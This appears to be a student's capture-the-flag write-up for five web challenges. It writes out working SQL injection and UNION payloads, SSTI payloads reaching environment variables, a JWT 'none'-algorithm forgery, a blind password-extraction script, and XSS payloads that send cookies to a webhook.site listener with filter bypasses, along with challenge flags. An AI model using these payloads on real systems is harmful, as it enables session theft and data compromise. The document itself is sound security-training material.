
# 1. Database Incursion V2
> Directly access the challenge server at   

## Solution:

- used sql injection `' or 1=1--` to log into the site
- got a clue saying someone in Management has pass so tried `' OR department = 'Management' -- `
- David notes says "Talk to Kiwi, she has the passcode.", searched up `Kiwi' AND department = 'Management'`
- passcode is `ecSKsN7SES`
- found this payload `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master -- ` to get table schema and columns names
- ran `' UNION SELECT 1, 2, 3, secrets FROM CITADEL_ARCHIVE_2077-- `


## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- SQLI concepts like UNION etc


## Resources:

- [read](https://owasp.org/www-community/attacks/SQL_Injection)
- [ytvid](https://www.youtube.com/watch?v=SWXsqiiZ1Vw)
***


# 2. Sweet Haven
> Directly access the challenge server at   

## Solution:

- clicked on register here with random username pass and got logged in to a review page
- found out i gotta use XSS cross script atk, tried `<img src=x onerror=alert('XSS');>` payload and it converted review to "Best coffee i ever had"
- XSS wasnt working here, tried SSTI, seems to be filtering certain payloads like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
- `\N{DOLLAR SIGN}{ 7*7 }` worked hinting $ is filtered
- `\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.environ}` revealed all the variables which included `FLAG`
- ran `\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.environ.FLAG}` and got the flag


## Flag:

```
nite{s5t1_w17h_un1c0d3_35c4p3_byp455}
```

## Concepts learnt:

- SSTI attack


## Resources:

- [read](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

***

# 3. Temporal Token
> I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live  

## Solution:

- found i gotta work with JWT editor, edited the algo to none and just passed the same payload(set exp to 1111111) as in the original cookie
- copy pasted the new cookie and reloaded the site, got flag


## Flag:

```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts learnt:

- editing jwt tokens


## Resources:

- [jwt editor](https://token.dev/)
***

# 4. Oneshot
> Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app


## Solution:

- went through code in app.py, it generates a random 32 digit id, creates a table and stores it. We only have one shot to create a session and check the password, and i cant keep guessin on same session as the script updates value of searched in the table

- asked gpt to create a script using js (as im not very good at scripting) so that i can paste it on the console of the new session

```js
(async function() {
    // 1. AUTOMATICALLY GET THE ID from the hidden field on the page
    let idInput = document.querySelector('input[name="id"]');

    let victimId = idInput.value;
    console.log(`[+] Found Victim ID: ${victimId}`);
    
    let password = "";
    
    // 2. LOOP to steal the password character by character
    for (let i = 1; i <= 32; i++) {
        // A. Get a new disposable session for this specific guess
        let sessHtml = await fetch("/new_session", {method: "POST"}).then(r => r.text());
        // Extract the temporary ID from the response HTML
        let tempId = sessHtml.match(/name="id" value="([a-f0-9]+)"/)[1];

        // B. Create the payload
        // We ask the DB: "Get the letter at position i"
        let payload = `z%' UNION SELECT substr(password,${i},1) FROM table_${victimId} --`;

        // C. Send the search
        let response = await fetch("/search", {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: `id=${tempId}&query=${encodeURIComponent(payload)}`
        }).then(r => r.text());

        // D. Read the result from the HTML list <li>C</li>
        let match = response.match(/<li>(.)<\/li>/);
        if (match) {
            password += match[1];
            console.log(`[+] Char ${i}: ${match[1]} | Current: ${password}`);
        } else {
            console.log(`[!] Retrying position ${i}...`);
            i--; // Retry if something glitched
        }
    }

    // 3. DONE
    console.log(`[!!!] FULL PASSWORD: ${password}`);
    alert(`Password Found: ${password}`);
})();


```


## Flag:

```
nite{are_you_feeling_the_heat_now :)}
```

***

# 5. Why is it not called css
> First `cd` into the `src` directory. Then run:

```bash
docker-compose up --build -d
```

The website will be accessible at http://localhost:56743

After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743

## Solution:

- since for the first step, bot will visit the site and post the session cookie according to the payload we gave, we need a listener to get the cookie. So i need a webhook which i got from webhook.site
- crafted a payload 
```js
<script>window.location='https://webhook.site/ID?c='+document.cookie</script>
```
- got this as response `xss2=/bf2a73106a3a6328746782b8b47e4bd350e`
- went there and the second level includeded bypassing the filter
```py
def filter_2(payload):
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
        ```

- added nested script tags to bypass, got link to third lvl

```js

<scrscriptipt>window.location='https://webhook.site/id?c='+document.cookie</scrscriptipt>

```
- have to bypass this filter now
```py
def filter_3(payload):
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```
- converted url to split string, then passed that payload
```js
<body onload="window.location='//webhook.site/400cb92a-3e04-4ec1-adaf-dad639cf6efd?c='+window['doc'+'ument']['coo'+'kie']">
```
- got the flag

## Flag:

```
nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
```

## Concepts learnt:

- XSS attacks, bypassing payload filters


## Resources:

- [xss info](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
***



